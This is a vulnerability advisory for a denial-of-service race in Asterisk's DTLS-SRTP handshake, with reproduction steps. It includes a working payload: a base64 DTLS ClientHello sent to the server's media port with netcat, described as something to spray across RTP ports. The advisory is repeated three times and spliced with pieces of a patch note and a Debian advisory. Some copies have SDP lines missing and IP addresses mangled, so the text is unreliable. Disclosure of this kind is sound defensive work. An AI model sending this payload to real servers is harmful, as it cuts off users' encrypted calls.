## TL;DR

When handling DTLS-SRTP for media setup, Asterisk is susceptible to Denial of Service due to a race condition in the hello handshake phase of the DTLS protocol. This attack can be done continuously, thus denying new DTLS-SRTP encrypted calls during the attack.

## Description

Our research has shown that key establishment for Secure Real-time Transport Protocol (SRTP) using Datagram Transport Layer Security Extension (DTLS)[1](#user-content-fn-1-d4c25493e4dd267ab5be03b6f8389dc3) is susceptible to a Denial of Service attack due to a race condition. If an attacker manages to send a ClientHello DTLS message with an invalid CipherSuite (such as `TLS_NULL_WITH_NULL_NULL`) to the port on the Asterisk server that is expecting packets from the caller, a DTLS error is generated. This results in the media session being torn down, which is followed by teardown at signaling (SIP) level too.

This behavior was tested against Asterisk version 20.1.0, which was found to be vulnerable to this issue.

The following sequence diagram shows the normal flow (i.e. no attack) involving SIP, STUN and DTLS messages between a UAC (the Caller) and an Asterisk server capable of handling WebRTC calls.

[![Diagram showing a call setup against Asterisk that uses SIP, STUN and DTLS](https://user-images.githubusercontent.com/1313984/290243231-38f4a2e4-67ce-4293-a9e6-585724178162.png)](https://user-images.githubusercontent.com/1313984/290243231-38f4a2e4-67ce-4293-a9e6-585724178162.png)

In a controlled experiment, it was observed that when the Attacker sent a DTLS ClientHello to Asterisk's media port from a different IP and port, Asterisk responded by sending a DTLS Alert to the Caller. Additionally, Asterisk terminated the SIP call by sending a BYE message to the Caller.

[![Diagram showing a call setup against Asterisk that fails due to an attacker controlled DTLS ClientHello](https://user-images.githubusercontent.com/1313984/290243412-90bb8204-89d3-4132-ba6c-bcd87aeaadaa.png)](https://user-images.githubusercontent.com/1313984/290243412-90bb8204-89d3-4132-ba6c-bcd87aeaadaa.png)

During a real attack, the attacker would spray a vulnerable Asterisk server with DTLS ClientHello messages. The attacker would typically target the range of UDP ports allocated for RTP. When the ClientHello message from the Attacker wins the race against an expected ClientHello from the Caller, the call terminates, resulting in Denial of Service.

## Impact

Abuse of this vulnerability may lead to a massive Denial of Service on vulnerable Asterisk servers for calls that rely on DTLS-SRTP.

## How to reproduce the issue

1. Prepare an Asterisk server with an extension configured to handle WebRTC; this may involve the following `pjsip.conf` and `extensions.conf` configuration updates:

   `pjsip.conf`

   ```
   [transport-tls-nat]
   type = transport
   protocol = wss
   bind = 172.17.0.2

   [webrtc_client]
   type=aor
   max_contacts=5
   remove_existing=yes

   [webrtc_client]
   type=auth
   auth_type=userpass
   username=3456
   password=3456

   [3456]
   type=endpoint
   aors=webrtc_client
   auth=webrtc_client
   dtls_auto_generate_cert=yes
   webrtc=yes
   context=default
   disallow=all
   allow=opus,ulaw
   ```

   `extensions.conf`

   ```
   [globals]

   [default]
   exten = _XXXX,1,Verbose(1, "User ${CALLERID(num)} dialed ${EXTEN}.")
   	same => n,Playback(demo-congrats)
   	same => n,Hangup()
   ```
2. Send an INVITE message to the target server with WebRTC SDP:

   ```
   INVITE sip:1000@192.168.1.202 SIP/2.0
   Via: SIP/2.0/WSS 192.168.1.202:36742;rport=36742;branch=z9hG4bK-4RHtimOzaIkHeUDU
   Max-Forwards: 70
   From: <sip:3456@192.168.1.202>;tag=cnbsc3nNX2ydugl4
   To: <sip:1000@192.168.1.202>
   Contact: <sip:3456@192.168.1.202>
   Call-ID: VaglTzNRBSuvPPdw
   CSeq: 5 INVITE
   Content-Type: application/sdp
   Content-Length: 563

   v=0
   o=- 1695296401 1695296401 IN IP4 192.168.1.202
   s=-
   t=0 0
   c=IN IP4 192.168.1.202

   a=ice-pwd:UQUtRMZKFERnmZqQdaggFzJBhcWVxabr
   a=candidate:6249488300 1 udp 2130706431 192.168.1.202 36866 typ host generation 0
   a=end-of-candidates
   a=rtcp-mux
   a=rtcprsize
   a=sendrecv

   ```
3. Note Asterisk's media port and IP values, which will be used as the `<asterisk-ip>` and `<media-port>` parameters by the Attacker
4. When the call has been established, send a STUN binding request which has the appropriate Username, Message-Integrity and Ice-Controlled properties
5. When the Binding Success Response message is received, send a DTLS ClientHello message from a (attacker-controlled) host, which is different from the Caller but has network access to the Asterisk server

   ```
   CLIENT_HELLO="Fv7/AAAAAAAAAAAAfAEAAHAAAAAAAAAAcP79AAA"
   CLIENT_HELLO="${CLIENT_HELLO}AAG4HCVaUNVbYVmxuqdn2WyCgtTijhZ+WheP/+H"
   CLIENT_HELLO="${CLIENT_HELLO}4AAAACAAABAABEABcAAP8BAAEAAAoACAAGAB0AF"
   CLIENT_HELLO="${CLIENT_HELLO}wAYAAsAAgEAACMAAAANABQAEgQDCAQEAQUDCAUF"
   CLIENT_HELLO="${CLIENT_HELLO}AQgGBgECAQAOAAkABgABAAgABwA="
   echo -n "${CLIENT_HELLO}" | base64 --decode | nc -u <asterisk-ip> <media-port>
   ```
6. Observe that the Caller receives a DTLS Alert message and a SIP BYE message on its signaling channel

Note that the above steps are used to reliably reproduce the vulnerability. In the case of a real attack, the attacker simply has to spray the Asterisk server with DTLS messages.

## Solution and recommendations

To address this vulnerability, upgrade Asterisk to the latest version which includes the security fix. The solution implemented is to drop all packets from addresses that have not been validated by an ICE check.

## TL;DR

When handling DTLS-SRTP for media setup, Asterisk is susceptible to Denial of Service due to a race condition in the hello handshake phase of the DTLS protocol. This attack can be done continuously, thus denying new DTLS-SRTP encrypted calls during the attack.

## Description

Our research has shown that key establishment for Secure Real-time Transport Protocol (SRTP) using Datagram Transport Layer Security Extension (DTLS)[^1] is susceptible to a Denial of Service attack due to a race condition. If an attacker manages to send a ClientHello DTLS message with an invalid CipherSuite (such as `TLS_NULL_WITH_NULL_NULL`) to the port on the Asterisk server that is expecting packets from the caller, a DTLS error is generated. This results in the media session being torn down, which is followed by teardown at signaling (SIP) level too.

This behavior was tested against Asterisk version 20.1.0, which was found to be vulnerable to this issue.

The following sequence diagram shows the normal flow (i.e. no attack) involving SIP, STUN and DTLS messages between a UAC (the Caller) and an Asterisk server capable of handling WebRTC calls.

Diagram showing a call setup against Asterisk that uses SIP, STUN and DTLS: <https://github.com/EnableSecurity/advisories/blob/master/ES2023-01-asterisk-dtls-hello-race/resources/valid.png>

In a controlled experiment, it was observed that when the Attacker sent a DTLS ClientHello to Asterisk's media port from a different IP and port, Asterisk responded by sending a DTLS Alert to the Caller. Additionally, Asterisk terminated the SIP call by sending a BYE message to the Caller.

Diagram showing a call setup against Asterisk that fails due to an attacker controlled DTLS ClientHello:
<https://github.com/EnableSecurity/advisories/blob/master/ES2023-01-asterisk-dtls-hello-race/resources/dos.png>

During a real attack, the attacker would spray a vulnerable Asterisk server with DTLS ClientHello messages. The attacker would typically target the range of UDP ports allocated for RTP. When the ClientHello message from the Attacker wins the race against an expected ClientHello from the Caller, the call terminates, resulting in Denial of Service.

## Impact

Abuse of this vulnerability may lead to a massive Denial of Service on vulnerable Asterisk servers for calls that rely on DTLS-SRTP.

## How to reproduce the issue

1. Prepare an Asterisk server with an extension configured to handle WebRTC; this may involve the following `pjsip.conf` and `extensions.conf` configuration updates:

    `pjsip.conf`
    ```ini
	[transport-tls-nat]
	type = transport
	protocol = wss
	bind = 172.17.0.2

	[webrtc_client]
	type=aor
	max_contacts=5
	remove_existing=yes

	[webrtc_client]
	type=auth
	auth_type=userpass
	username=3456
	password=3456

	[3456]
	type=endpoint
	aors=webrtc_client
	auth=webrtc_client
	dtls_auto_generate_cert=yes
	webrtc=yes
	context=default
	disallow=all
	allow=opus,ulaw
	```

	`extensions.conf`
	```ini
	[globals]

	[default]
	exten = _XXXX,1,Verbose(1, "User ${CALLERID(num)} dialed ${EXTEN}.")
		same => n,Playback(demo-congrats)
		same => n,Hangup()
	```
1. Send an INVITE message to the target server with WebRTC SDP:

    ```default
	INVITE sip:1000@....168.1.202 SIP/2.0
	Via: SIP/2.0/WSS 192.168.1.202:36742;rport=36742;branch=z9hG4bK-4RHtimOzaIkHeUDU
	Max-Forwards: 70
	From: <sip:3456@....168.1.202>;tag=cnbsc3nNX2ydugl4
	To: <sip:1000@....168.1.202>
	Contact: <sip:3456@....168.1.202>
	Call-ID: VaglTzNRBSuvPPdw
	CSeq: 5 INVITE
	Content-Type: application/sdp
	Content-Length: 563

	v=0
	o=- 1695296401 1695296401 IN IP4 192.168.1.202
	s=-
	t=0 0
	c=IN IP4 192.168.1.202
	m=audio 36866 UDP/TLS/RTP/SAVPF 0 8 101
	a=setup:active
	a=fingerprint:sha-256 49:05:98:B2:15:43:1C:9C:4F:29:07:60:F8:63:77:16:80:F9:44:C0:97:8E:E5:48:D6:71:B4:03:10:85:D6:E3
	a=rtpmap:0 PCMU/8000/1
	a=rtpmap:8 PCMA/8000/1
	a=rtpmap:101 telephone-event/8000
	a=ice-ufrag:IOZyOSQkVywevryI
	a=ice-pwd:UQUtRMZKFERnmZqQdaggFzJBhcWVxabr
	a=candidate:6249488300 1 udp 2130706431 192.168.1.202 36866 typ host generation 0
	a=end-of-candidates
	a=rtcp-mux
	a=rtcprsize
	a=sendrecv

	```
1. Note Asterisk's media port and IP values, which will be used as the `<asterisk-ip>` and `<media-port>` parameters by the Attacker
1. When the call has been established, send a STUN binding request which has the appropriate Username, Message-Integrity and  Ice-Controlled properties
1. When the Binding Success Response message is received, send a DTLS ClientHello message from a (attacker-controlled) host, which is different from the Caller but has network access to the Asterisk server

    ```bash
	CLIENT_HELLO="Fv7/AAAAAAAAAAAAfAEAAHAAAAAAAAAAcP79AAA"
	CLIENT_HELLO="${CLIENT_HELLO}AAG4HCVaUNVbYVmxuqdn2WyCgtTijhZ+WheP/+H"
	CLIENT_HELLO="${CLIENT_HELLO}4AAAACAAABAABEABcAAP8BAAEAAAoACAAGAB0AF"
	CLIENT_HELLO="${CLIENT_HELLO}wAYAAsAAgEAACMAAAANABQAEgQDCAQEAQUDCAUF"
	CLIENT_HELLO="${CLIENT_HELLO}AQgGBgECAQAOAAkABgABAAgABwA="
	echo -n "${CLIENT_HELLO}" | base64 --decode | nc -u <asterisk-ip> <media-port>
	```
1. Observe that the Caller receives a DTLS Alert message and a SIP BYE message on its signaling channel

Note that the above steps are used to reliably reproduce the vulnerability. In the case of a real attack, the attacker simply has to spray the Asterisk server with DTLS messages.

## Solution and recommendations

To address this vulnerability, upgrade Asterisk to the latest version which includes the security fix. The solution implemented is to drop all packets from addresses that have not been validated by an ICE check.

When ICE is in use, we can prevent a possible DOS attack by allowing
DTLS protocol messages (client hello, etc) only from sources that
are in the active remote candidates list.

    The 'update' functionality of the PJSIP_HEADER dialplan function can exceed
    the available buffer space for storing the new value of a header. By doing
    so this can overwrite memory or cause a crash. This is not externally
    exploitable, unless dialplan is explicitly written to update a header based
    on data from an outside source. If the 'update' functionality is not used
    the vulnerability does not occur.

CVE-2023-38703

    PJSIP is a free and open source multimedia communication library written in
    C with high level API in C, C++, Java, C#, and Python languages. SRTP is a
    higher level media transport which is stacked upon a lower level media
    transport such as UDP and ICE. Currently a higher level transport is not
    synchronized with its lower level transport that may introduce a
    use-after-free issue. This vulnerability affects applications that have
    SRTP capability (`PJMEDIA_HAS_SRTP` is set) and use underlying media
    transport other than UDP. This vulnerability’s impact may range from
    unexpected application termination to control flow hijack/memory
    corruption.

CVE-2023-49294

    It is possible to read any arbitrary file even when the `live_dangerously`
    option is not enabled.

CVE-2023-49786

   Asterisk is susceptible to a DoS due to a race condition in the hello
   handshake phase of the DTLS protocol when handling DTLS-SRTP for media
   setup. This attack can be done continuously, thus denying new DTLS-SRTP
   encrypted calls during the attack. Abuse of this vulnerability may lead to
   a massive Denial of Service on vulnerable Asterisk servers for calls that
   rely on DTLS-SRTP.

For Debian 10 buster, these problems have been fixed in version
1:16.28.0~dfsg-0+deb10u4.

We recommend that you upgrade your asterisk packages.

## TL;DR

When handling DTLS-SRTP for media setup, Asterisk is susceptible to Denial of Service due to a race condition in the
hello handshake phase of the DTLS protocol. This attack can be done continuously, thus denying new DTLS-SRTP encrypted
calls during the attack.

## Description

Our research has shown that key establishment for Secure Real-time Transport Protocol (SRTP) using Datagram Transport
Layer Security Extension (DTLS)[^1] is susceptible to a Denial of Service attack due to a race condition. If an
attacker manages to send a ClientHello DTLS message with an invalid CipherSuite (such as `TLS_NULL_WITH_NULL_NULL`) to
the port on the Asterisk server that is expecting packets from the caller, a DTLS error is generated. This results in
the media session being torn down, which is followed by teardown at signaling (SIP) level too.

This behavior was tested against Asterisk version 20.1.0, which was found to be vulnerable to this issue.

The following sequence diagram shows the normal flow (i.e. no attack) involving SIP, STUN and DTLS messages between a
UAC (the Caller) and an Asterisk server capable of handling WebRTC calls.

Diagram showing a call setup against Asterisk that uses SIP, STUN and DTLS:
<https://github.com/EnableSecurity/advisories/blob/master/ES2023-01-asterisk-dtls-hello-race/resources/valid.png>

In a controlled experiment, it was observed that when the Attacker sent a DTLS ClientHello to Asterisk's media port
from a different IP and port, Asterisk responded by sending a DTLS Alert to the Caller. Additionally, Asterisk
terminated the SIP call by sending a BYE message to the Caller.

Diagram showing a call setup against Asterisk that fails due to an attacker controlled DTLS ClientHello:
<https://github.com/EnableSecurity/advisories/blob/master/ES2023-01-asterisk-dtls-hello-race/resources/dos.png>

During a real attack, the attacker would spray a vulnerable Asterisk server with DTLS ClientHello messages. The
attacker would typically target the range of UDP ports allocated for RTP. When the ClientHello message from the
Attacker wins the race against an expected ClientHello from the Caller, the call terminates, resulting in Denial of
Service.

## Impact

Abuse of this vulnerability may lead to a massive Denial of Service on vulnerable Asterisk servers for calls that rely
on DTLS-SRTP.

## How to reproduce the issue

1. Prepare an Asterisk server with an extension configured to handle WebRTC; this may involve the following
`pjsip.conf` and `extensions.conf` configuration updates:

    `pjsip.conf`
    ```ini
        [transport-tls-nat]
        type = transport
        protocol = wss
        bind = 172.17.0.2

        [webrtc_client]
        type=aor
        max_contacts=5
        remove_existing=yes

        [webrtc_client]
        type=auth
        auth_type=userpass
        username=3456
        password=3456

        [3456]
        type=endpoint
        aors=webrtc_client
        auth=webrtc_client
        dtls_auto_generate_cert=yes
        webrtc=yes
        context=default
        disallow=all
        allow=opus,ulaw
        ```

        `extensions.conf`
        ```ini
        [globals]

        [default]
        exten = _XXXX,1,Verbose(1, "User ${CALLERID(num)} dialed ${EXTEN}.")
                same => n,Playback(demo-congrats)
                same => n,Hangup()
        ```
1. Send an INVITE message to the target server with WebRTC SDP:

    ```default
        INVITE sip:1000@192.168.1.202 SIP/2.0
        Via: SIP/2.0/WSS 192.168.1.202:36742;rport=36742;branch=z9hG4bK-4RHtimOzaIkHeUDU
        Max-Forwards: 70
        From: <sip:3456@192.168.1.202>;tag=cnbsc3nNX2ydugl4
        To: <sip:1000@192.168.1.202>
        Contact: <sip:3456@192.168.1.202>
        Call-ID: VaglTzNRBSuvPPdw
        CSeq: 5 INVITE
        Content-Type: application/sdp
        Content-Length: 563

        v=0
        o=- 1695296401 1695296401 IN IP4 192.168.1.202
        s=-
        t=0 0
        c=IN IP4 192.168.1.202
        m=audio 36866 UDP/TLS/RTP/SAVPF 0 8 101
        a=setup:active
        a=fingerprint:sha-256
49:05:98:B2:15:43:1C:9C:4F:29:07:60:F8:63:77:16:80:F9:44:C0:97:8E:E5:48:D6:71:B4:03:10:85:D6:E3
        a=rtpmap:0 PCMU/8000/1
        a=rtpmap:8 PCMA/8000/1
        a=rtpmap:101 telephone-event/8000
        a=ice-ufrag:IOZyOSQkVywevryI
        a=ice-pwd:UQUtRMZKFERnmZqQdaggFzJBhcWVxabr
        a=candidate:6249488300 1 udp 2130706431 192.168.1.202 36866 typ host generation 0
        a=end-of-candidates
        a=rtcp-mux
        a=rtcprsize
        a=sendrecv

        ```
1. Note Asterisk's media port and IP values, which will be used as the `<asterisk-ip>` and `<media-port>` parameters by
the Attacker
1. When the call has been established, send a STUN binding request which has the appropriate Username,
Message-Integrity and  Ice-Controlled properties
1. When the Binding Success Response message is received, send a DTLS ClientHello message from a (attacker-controlled)
host, which is different from the Caller but has network access to the Asterisk server

    ```bash
        CLIENT_HELLO="Fv7/AAAAAAAAAAAAfAEAAHAAAAAAAAAAcP79AAA"
        CLIENT_HELLO="${CLIENT_HELLO}AAG4HCVaUNVbYVmxuqdn2WyCgtTijhZ+WheP/+H"
        CLIENT_HELLO="${CLIENT_HELLO}4AAAACAAABAABEABcAAP8BAAEAAAoACAAGAB0AF"
        CLIENT_HELLO="${CLIENT_HELLO}wAYAAsAAgEAACMAAAANABQAEgQDCAQEAQUDCAUF"
        CLIENT_HELLO="${CLIENT_HELLO}AQgGBgECAQAOAAkABgABAAgABwA="
        echo -n "${CLIENT_HELLO}" | base64 --decode | nc -u <asterisk-ip> <media-port>
        ```
1. Observe that the Caller receives a DTLS Alert message and a SIP BYE message on its signaling channel

Note that the above steps are used to reliably reproduce the vulnerability. In the case of a real attack, the attacker
simply has to spray the Asterisk server with DTLS messages.

## Solution and recommendations

To address this vulnerability, upgrade Asterisk to the latest version which includes the security fix. The solution
implemented is to drop all packets from addresses that have not been validated by an ICE check.
